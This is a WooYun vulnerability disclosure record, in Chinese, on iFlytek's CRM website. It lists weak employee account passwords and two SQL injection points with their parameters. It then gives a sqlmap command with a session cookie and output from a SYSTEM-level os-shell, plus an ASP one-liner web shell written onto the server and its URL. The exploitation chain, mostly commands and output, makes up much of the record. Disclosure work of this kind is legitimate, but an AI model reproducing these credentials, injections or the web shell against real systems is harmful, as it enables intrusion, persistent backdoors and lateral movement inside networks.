{"id": 86240, "wybug_id": "wooyun-2016-0189161", "wybug_title": "科大讯飞某系统存在弱口令SQL注入导致Shell(可内网)", "wybug_corp": "iflytek.com", "wybug_author": "harbour_bin", "wybug_date": "2016-03-25 23:59", "wybug_open_date": "2016-05-12 14:05", "wybug_type": "后台弱口令", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["弱口令", "注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-12：\t细节向公众公开  简要描述： 源于一次科大讯飞的面试, 问有没有测试过你们家的网站, 所以我来了...PS:这两个月一直忙于考试,今天我胡汉三终于回来了.  详细说明：  \nurl:http://crm.iflytek.com/\n#1 账户体系控制不严 (姓名格式为: 名+姓)\nlitao 88888888lixin 88888888\n进入系统\n\n相关厂商\n\n仅证明#2 两处SQL注入\ncrm.iflytek.com/china/resultchina.asp?sort1=1&D=mc&E=cpmc&F=htzt&G=xm&C=1&Submit422=+\n注入参数: C\nhttp://crm.iflytek.com/work/telhy.asp?ksjs=mc&ksjs2=1\n注入参数: ksjs2Sqlmap执行语句\nD:\\Python27>python sqlmap\\sqlmap.py -u \"crm.iflytek.com/china/resultchina.asp?sort1=1&D=mc&E=cpmc&F=htzt&G=xm&C=1*&Submit422=+\" --cookie=\"ASPSESSIONIDSQRATDAQ=EKMFKFJCFBNPJLMPCGEAODJJ\" -f -b --dbs --users\n证明：\n\nDBA权限\n\n#3 进入os-shell, 执行命令, 服务器在内网, 可域渗透\nwhoami nt authority\\system\n\nipconfigWindows IP ConfigurationEthernet adapter 内网:   Connection-specific DNS Suffix  . :   IP Address. . . . . . . . . . . . : 172.16.75.128   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 172.16.75.254\n\nnet view /domainDomain-------------------------------------------------------------------------------MYGROUPWGWORKGROUPThe command completed successfully.\n#4 成功shell\ndir d:\\zbintel31.462014-01-21  11:45    <DIR>          .2014-01-21  11:45    <DIR>          ..2014-01-21  11:45                 3 1.txt2011-06-09  21:21                 0 1.txt.bak2011-08-17  09:35    <DIR>          alt2014-01-21  11:31    <DIR>          aspnet_client2011-08-17  09:31    <DIR>          back2011-08-17  09:31    <DIR>          bank2011-06-09  21:21             1,674 Browser.asp2011-08-17  09:31    <DIR>          caigou2011-08-17  09:31    <DIR>          caigouth2011-08-17  09:31    <DIR>          call2011-08-17  09:31    <DIR>          chance2011-06-09  21:21               504 check.asp2011-06-09  21:21               862 checkid.asp2011-06-09  22:57               115 checkin.asp2011-06-09  22:57               115 checkin2.asp2011-08-17  09:31    <DIR>          china2011-06-09  21:21                 2 chkamin.asp2011-08-17  09:31    <DIR>          contract2011-08-17  09:31    <DIR>          contractth2011-08-18  10:01    <DIR>          Copy (2) of email2011-08-18  10:01    <DIR>          Copy of email2011-08-18  10:01    <DIR>          Copy of email_sor2011-06-09  22:57               115 Copy of index2.as2011-08-18  10:01    <DIR>          Copy of manager2011-08-18  10:01    <DIR>          Copy of sortsms2011-07-01  19:18           561,453 creat.asp2011-09-07  08:54                78 css.css2011-06-09  22:57               115 default.asp2011-08-17  09:46    <DIR>          Dll2011-08-17  09:43    <DIR>          Edit2011-08-17  09:32    <DIR>          Edit12011-08-17  09:32    <DIR>          editor_min2011-08-18  10:00    <DIR>          email2011-08-17  09:32    <DIR>          email_sort2011-08-17  09:32    <DIR>          event2011-06-09  21:21               531 feet.htm2011-08-17  09:32    <DIR>          help2011-08-17  09:32    <DIR>          hl2011-08-17  09:32    <DIR>          hr2011-08-17  09:32    <DIR>          http2014-01-18  15:15    <DIR>          images2011-08-17  09:32    <DIR>          imageshelp2011-08-17  09:33    <DIR>          in2011-08-17  09:33    <DIR>          inc2011-08-17  09:33    <DIR>          inchelp2011-09-07  13:42               818 index2.asp2011-06-09  22:57               115 index22.asp2011-09-07  08:56               816 index222.asp2011-06-09  22:57               115 index3.asp2011-06-09  22:57               115 index4.asp2011-06-09  22:57               115 index5.asp2011-06-09  22:57               115 index6.asp2011-09-07  09:08    <DIR>          js2011-08-17  09:33    <DIR>          learn2011-08-17  09:33    <DIR>          learnhd2011-08-17  09:33    <DIR>          learnimg2011-08-17  09:33    <DIR>          learntz2011-08-17  09:33    <DIR>          lend2011-08-17  09:33    <DIR>          load2011-08-17  09:33    <DIR>          load22011-06-09  21:21             4,759 logo_alle.gif2011-08-17  09:33    <DIR>          make2011-08-17  09:41    <DIR>          manager2011-08-17  09:33    <DIR>          Manufacture2011-08-17  09:33    <DIR>          message2011-08-17  09:33    <DIR>          moban2011-08-17  09:33    <DIR>          money2011-08-17  09:33    <DIR>          money22011-08-17  09:33    <DIR>          money32011-08-17  09:33    <DIR>          money42011-08-17  09:33    <DIR>          notebook2011-08-17  09:33    <DIR>          num_sort2011-08-17  09:33    <DIR>          ocx2011-08-17  09:33    <DIR>          option2011-08-17  09:33    <DIR>          out2011-08-17  09:33    <DIR>          part2011-08-17  09:33    <DIR>          pay2011-08-17  09:34    <DIR>          person2011-08-17  09:34    <DIR>          plan2011-08-17  09:34    <DIR>          plan22011-08-17  09:34    <DIR>          plan32011-08-17  09:34    <DIR>          price2011-08-17  09:34    <DIR>          product2011-08-17  09:34    <DIR>          publiccla2011-08-17  09:34    <DIR>          return2011-08-17  09:34    <DIR>          search2011-08-17  09:34    <DIR>          search22011-08-17  09:34    <DIR>          sent2011-08-17  09:34    <DIR>          service2011-06-09  21:21               174 set1.asp2011-08-17  09:34    <DIR>          setjm2011-06-09  21:21             2,413 setup.asp2011-06-09  21:21             2,205 setup111.asp2011-08-17  09:34    <DIR>          smtp2011-08-17  09:34    <DIR>          sort2011-08-17  09:34    <DIR>          sort32011-08-17  09:34    <DIR>          sort42011-08-17  09:34    <DIR>          sort52011-08-17  09:34    <DIR>          sortalt2011-08-17  09:34    <DIR>          sortbank2011-08-17  09:34    <DIR>          sortbz2011-08-17  09:34    <DIR>          sortcp2011-08-17  09:34    <DIR>          sortcp22011-08-17  09:34    <DIR>          sortimg2011-08-17  09:34    <DIR>          sortjf2011-08-17  09:34    <DIR>          sortjh22011-08-17  09:34    <DIR>          sortkc12011-08-17  09:34    <DIR>          sortkc22011-08-17  09:34    <DIR>          sortkh2011-08-17  09:34    <DIR>          sortpower2011-08-17  09:34    <DIR>          sortqb2011-08-17  09:34    <DIR>          sortre12011-08-17  09:34    <DIR>          sortre22011-08-17  09:34    <DIR>          sortset2011-08-17  09:34    <DIR>          sortsms2011-08-17  09:34    <DIR>          sortsp2011-08-17  09:34    <DIR>          sorttz2011-08-17  09:34    <DIR>          sortwages2011-08-17  09:34    <DIR>          sortwagesjj2011-08-17  09:34    <DIR>          sortwd2011-08-17  09:34    <DIR>          sortxm12011-08-17  09:34    <DIR>          sortzs2011-08-17  09:34    <DIR>          store2011-08-17  09:34    <DIR>          test2011-08-17  09:34    <DIR>          test112011-08-17  09:35    <DIR>          tongji2011-08-17  09:35    <DIR>          tongji32011-08-17  09:35    <DIR>          tongxl\n写wooyun1.asp\necho “<%execute(request(\"value\"))%>”>>d:\\zbintel31.46\\wooyun.asp\n木马文件: http://crm.iflytek.com/wooyun1.asp \n\n   漏洞证明：  已证明！PS：仅测试, 未进行非法操作！   修复方案：  1、弱口令修复; 2、SQL注入过滤;3、数据库权限设置;4、你们更专业   版权声明：转载请注明来源 harbour_bin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-03-28 14:05 厂商回复： 666 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-26 10:13 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:260 漏洞数:64        | http://sec.tuniu.com)\t\t \n  牛逼    \n     2016-03-26 10:30 |    \t\tharbour_bin \t\t\t( 普通白帽子  |\t\t\t        Rank:569 漏洞数:68        | 好好提升自己...)\t\t \n  @qhwlpg 最近在看你的关于代码审计方面的漏洞    \n     2016-03-26 13:35 |    \t\tFormat_smile \t\t\t( 普通白帽子  |\t\t\t        Rank:484 漏洞数:172        | ···孰能无过，谁是谁非！)\t\t \n  6666，就是这个节奏。啪啪啪，好响    \n     2016-03-28 14:07 |    \t\t奶嘴 \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:93        | 16岁的毛孩有些厂商故意加你好友，和你聊...)\t\t \n    学大牛之看我也来个科大讯飞的洞    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}